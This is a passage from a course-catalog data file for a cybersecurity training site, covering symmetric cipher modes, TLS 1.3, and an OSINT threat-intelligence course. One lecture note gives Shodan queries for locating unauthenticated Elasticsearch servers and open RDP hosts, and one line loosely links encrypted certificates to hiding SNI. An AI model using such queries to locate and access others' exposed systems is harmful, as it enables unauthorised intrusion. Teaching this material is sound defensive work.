        description: 'Stream vs block ciphers, ECB flaws, CBC padding oracles, and modern AES-GCM.',
        lessons: [
          {
            id: 'cry-les-1-1',
            title: 'The Fundamentals of Symmetric Ciphers & Why ECB is Fatal',
            duration: '21 min',
            isFree: true,
            summary: 'Understanding block size, substitution-permutation networks, and why Electronic Codebook (ECB) leaks visual and structural data.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/O_eBfF03yps',
            videoType: 'youtube',
            lectureNotes: `# Symmetric Ciphers & Modes of Operation

### Block Cipher Modes:
1. **ECB (Electronic Codebook)**: Never use! Identical plaintext blocks produce identical ciphertext blocks.
2. **CBC (Cipher Block Chaining)**: Requires unpredictable IV; vulnerable to padding oracle attacks if MAC isn't applied first.
3. **GCM (Galois/Counter Mode)**: Gold standard Authenticated Encryption with Associated Data (AEAD). Provides confidentiality + cryptographic authenticity verification.`
          },
          {
            id: 'cry-les-1-2',
            title: 'TLS 1.3 Handshake & Perfect Forward Secrecy (PFS)',
            duration: '28 min',
            isFree: true,
            summary: 'Why TLS 1.3 removed vulnerable legacy ciphers (RC4, DES, CBC, static RSA key exchange) in favor of ECDHE.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/OU-A2EmVrKQ',
            videoType: 'youtube',
            lectureNotes: `# TLS 1.3 Security Enhancements

### Key Changes:
- 1-RTT Handshake (Zero-RTT resume option)
- Removed static RSA key exchange (enforces Perfect Forward Secrecy via ephemeral Diffie-Hellman)
- Encrypted handshake certificates to prevent passive SNI wiretapping`
          },
          {
            id: 'cry-les-1-3',
            title: 'Modern Password Hashing: Argon2id & Memory-Hard Defense',
            duration: '30 min',
            isFree: false,
            summary: 'Benchmarking MD5/SHA256 (unsuitable for passwords) against Argon2id and scrypt to defeat GPU/ASIC brute forcing.'
          }
        ]
      }
    ]
  },
  {
    id: 'course-osint-threat-intel',
    slug: 'operational-cyber-threat-intelligence-advanced-osint',
    title: 'Operational Cyber Threat Intelligence (CTI) & Advanced OSINT',
    category: 'OSINT & Threat Intelligence',
    difficulty: 'Beginner',
    duration: '22 Hours',
    modulesCount: 5,
    lessonsCount: 17,
    pricePKR: 10500,
    priceUSD: 38,
    isPremium: true,
    badge: 'Strategic Defense',
    description: 'Harvest actionable intelligence, track APT campaigns, correlate threat infrastructure using Shodan & Maltego, and audit dark web leaks.',
    detailedOverview: 'Learn how modern threat hunters map adversary infrastructure before attacks occur. This hands-on course covers passive reconnaissance, STIX/TAXII threat feed ingestion, and dark web monitoring without burning operational security.',
    instructor: {
      name: 'Muhammad Zaib Zafar',
      role: 'Security Analyst & Penetration Tester',
      bio: 'Threat intelligence researcher specializing in adversary TTP tracking, dark web breach triangulation, and open-source intelligence.',
      certifications: ['CEH v12', 'OSINT Specialist', 'Wazuh SOC Analyst']
    },
    skills: [
      'Advanced Google Dorking & Search Operator Syntax',
      'Shodan & Censys Attack Surface Enumeration',
      'Adversary Infrastructure Graphing with Maltego',
      'STIX/TAXII Standards & Threat Intelligence Platforms (MISP)',
      'Dark Web Threat Actor & Ransomware Portal Tracking',
      'Passive DNS & SSL Certificate Pivot Investigations'
    ],
    prerequisites: ['Curious mindset and basic internet protocol knowledge'],
    labsIncluded: ['lab-osint-recon', 'lab-misp-intel'],
    chapters: [
      {
        id: 'osi-ch-1',
        chapterNumber: 1,
        title: 'Intelligence Fundamentals & OPSEC Standards',
        description: 'Intelligence cycle, sock puppets, and secure investigation environments.',
        lessons: [
          {
            id: 'osi-les-1-1',
            title: 'The Intelligence Cycle & Ethical Investigation Boundaries',
            duration: '20 min',
            isFree: true,
            summary: 'Planning & Direction, Collection, Processing, Analysis, and Dissemination phases.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/Y0rLwz3mFvY',
            videoType: 'youtube',
            lectureNotes: `# The Cyber Threat Intelligence Cycle

### 5 Phases:
1. **Direction**: Defining Intelligence Requirements (PIRs)
2. **Collection**: Gathering OSINT, telemetry, darknet chatter, passive DNS
3. **Processing**: Normalizing data into STIX format
4. **Analysis**: Correlating indicators with MITRE ATT&CK techniques
5. **Dissemination**: Delivering executive threat briefs and blocking IoCs on edge firewalls`
          },
          {
            id: 'osi-les-1-2',
            title: 'Shodan & Censys Query Mastery for Attack Surface Discovery',
            duration: '31 min',
            isFree: true,
            summary: 'Finding exposed databases, industrial control systems, RDP portals, and unauthenticated webcams.',
            videoUrl: 'https://www.youtube-nocookie.com/embed/4t4kBkMsDbY',
            videoType: 'youtube',
            lectureNotes: `# Power Shodan Dorks for Analysts

\`\`\`bash
# Exposed Elasticsearch instances without auth
product:"Elasticsearch" port:9200 "status" : 200

# Open RDP servers
port:3389 has_screenshot:true

# SSL Certificate Common Name pivoting
ssl.cert.subject.cn:"example.com"
\`\`\``
          },
          {
            id: 'osi-les-1-3',
            title: 'Graphing Threat Actors with Maltego & AlienVault OTX',
            duration: '33 min',
            isFree: false,
            summary: 'Transforming domain names into IP addresses, MX servers, and correlated malware hashes.'
          }
        ]
      }
    ]
  }
];
